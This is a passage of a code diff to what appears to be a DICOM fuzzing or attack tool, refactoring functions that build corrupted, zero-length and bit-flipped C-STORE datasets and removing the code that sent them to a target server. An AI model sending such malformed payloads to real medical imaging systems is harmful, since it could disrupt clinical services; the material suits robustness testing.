                       sop_instance_uid: str = '1.2.3.4.5') -> AttackResult:
-        """
-        C-STORE with corrupted dataset.
-        """
-        if not SCAPY_AVAILABLE:
-            return AttackResult(
-                name='corrupt_store',
-                category='combined',
-                payload=dataset_attack.payload,
-                description='Scapy not available',
-                expected_behavior='N/A',
-                success=False,
-            )
-        
+        """C-STORE payload with corrupted dataset."""
         sop_class = sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID
-        
-        try:
-            with DICOMSocket(target[0], target[1], 'TARGET', 'ATTACKER') as sock:
-                if not sock.associate({
-                    sop_class: [DEFAULT_TRANSFER_SYNTAX_UID]
-                }):
-                    return AttackResult(
-                        name='corrupt_store',
-                        category='combined',
-                        payload=dataset_attack.payload,
-                        description='Association rejected',
-                        expected_behavior='N/A',
-                        success=False,
-                    )
-                
-                status = sock.c_store(
-                    dataset_attack.payload,
-                    sop_class,
-                    sop_instance_uid,
-                    DEFAULT_TRANSFER_SYNTAX_UID,
-                )
-                
-                return AttackResult(
-                    name='corrupt_store',
-                    category='combined',
-                    payload=dataset_attack.payload,
-                    description=f'C-STORE with {dataset_attack.name}',
-                    expected_behavior='Target should reject corrupt dataset',
-                    metadata={'inner_attack': dataset_attack.name, 'status': status},
-                    success=True,
-                )
-                
-        except Exception as e:
-            return AttackResult(
-                name='corrupt_store',
-                category='combined',
-                payload=dataset_attack.payload,
-                description=f'Failed: {e}',
-                expected_behavior='N/A',
-                success=False,
-            )
-    
+        return AttackResult(
+            name='corrupt_store',
+            category='combined',
+            payload=dataset_attack.payload,
+            description=f'C-STORE with {dataset_attack.name}',
+            expected_behavior='Target should reject corrupt dataset',
+            metadata={
+                'inner_attack': dataset_attack.name,
+                'delivery': 'cstore',
+                'sop_class_uid': sop_class,
+                'sop_instance_uid': sop_instance_uid,
+            },
+        )
+
     @staticmethod
-    def zero_length_dataset(target: Tuple[str, int]) -> AttackResult:
+    def zero_length_dataset() -> AttackResult:
         """C-STORE with empty dataset."""
         return CombinedAttacks.corrupt_store(
-            target,
             AttackResult(
                 name='zero_length',
                 category='combined',
@@ -1791,19 +1772,17 @@ class CombinedAttacks:
                 expected_behavior='Should reject',
             ),
         )
-    
+
     @staticmethod
-    def bitflip_corruption(target: Tuple[str, int], 
-                          dataset: bytes, 
-                          flip_count: int = 10) -> AttackResult:
+    def bitflip_corruption(dataset: bytes,
+                           flip_count: int = 10) -> AttackResult:
         """C-STORE with random bit flips."""
         corrupted = bytearray(dataset)
         for _ in range(min(flip_count, len(corrupted))):
             idx = random.randint(0, len(corrupted) - 1)
             corrupted[idx] ^= random.randint(1, 255)
-        
+
         return CombinedAttacks.corrupt_store(
-            target,
             AttackResult(
                 name='bitflip',
                 category='combined',
@@ -1812,3 +1791,8 @@ class CombinedAttacks:
                 expected_behavior='Should handle gracefully',
             ),
         )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield combined attack payloads."""
+        yield cls.zero_length_dataset()
